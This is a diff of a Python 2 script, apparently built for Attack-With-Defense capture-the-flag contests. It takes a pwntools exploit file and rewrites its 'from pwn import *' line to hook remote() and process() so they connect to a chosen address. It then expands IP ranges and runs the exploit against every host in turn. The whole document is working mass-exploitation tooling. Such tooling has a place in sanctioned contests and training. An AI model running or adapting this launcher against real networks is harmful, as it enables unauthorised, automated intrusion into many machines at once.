@@ -1,24 +1,94 @@
 #!/usr/bin/python
+import logging
 
-import sys
+import argparse
+import traceback as tb
 
-exp = open(sys.argv[1]).read()
-ip = sys.argv[2]
-port = sys.argv[3]
+# global const var
 
-exp = open('test.py').read()
-ip = 'localhost'
-port = 1234
-
-hook_script = '''\
+EXP = ''
+PORT = 0
+HOOK_SCRIPT = '''\
 from pwn import *
+context.log_level = 100
+# disable pwnlib log
+logger = logging.getLogger('pwnlib')
+logger.handlers = []
 old_remote = remote
 def new_remote(*args, **kwargs):
-    return old_remote('{}', {})
+    global AWD_REMOTE
+    AWD_REMOTE = old_remote(AWD_IP, AWD_PORT)
+    return AWD_REMOTE
 process = new_remote
 remote = new_remote
 '''
 
-new_exp = exp.replace('from pwn import *\n', hook_script.format(ip, port))
-empty_globals = {}
-exec(new_exp, empty_globals)
+def get_ip_list(raw_ip):
+    def get_range(str_num):
+        # get (min,max)
+        try:
+            num = int(str_num)
+            return num, num
+        except ValueError:
+            min_, max_ = str_num.split('-')
+            return int(min_), int(max_)
+
+    if '-' not in raw_ip:
+        return [raw_ip]
+    tmp = raw_ip.split('.')
+    tmp = [get_range(_) for _ in tmp]
+    lst = []
+    for A in range(tmp[0][0], tmp[0][1]+1):
+        for B in range(tmp[1][0], tmp[1][1]+1):
+            for C in range(tmp[2][0], tmp[2][1]+1):
+                for D in range(tmp[3][0], tmp[3][1]+1):
+                    lst.append('.'.join(map(str, [A,B,C,D])))
+    return lst
+
+def attack_single(ip):
+    var = {'AWD_IP':ip, 'AWD_PORT':PORT}
+    try:
+        exec(EXP, var)
+    except Exception, e:
+        logging.info('Failed to exploit {}'.format(ip))
+        exc_log = 'Error for {}, detailed info:\n'.format(ip)
+        exc_log += tb.format_exc()
+        logging.debug(exc_log)
+        
+    finally:
+        if 'AWD_REMOTE' in var:
+            var['AWD_REMOTE'].close()
+
+def attack_multi(ip_list):
+    for ip in ip_list:
+        logging.info('Trying to attack {}'.format(ip))
+        attack_single(ip)
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument('exp', metavar='exploit.py')
+    parser.add_argument('ip', help='support ip range like 192.168.1.1-15 192.168.1-15.1')
+    parser.add_argument('port', type=int)
+    parser.add_argument('-d', type=int, choices=[0, 1, 2], default=0,
+                    help='debug level')
+    args = parser.parse_args()
+    
+    #init
+    if args.d >= 1:
+        log_level = logging.DEBUG
+    else:
+        log_level = logging.INFO
+    if args.d == 2:
+        HOOK_SCRIPT = HOOK_SCRIPT.replace('context.log_level = 100', 'context.log_level = \'debug\'')
+    logging.basicConfig(level=log_level,
+        format='%(levelname)s | %(asctime)s | %(filename)s[line:%(lineno)d] | %(message)s',
+        datefmt='%H:%M:%S') 
+    EXP = open(args.exp).read().replace('from pwn import *\n', HOOK_SCRIPT)
+    logging.debug('New exp script:\n{}'.format(EXP))
+    ip_list = get_ip_list(args.ip)
+    PORT = args.port
+
+            
+    
+    attack_multi(ip_list)
+    logging.info('Auto awd finished')
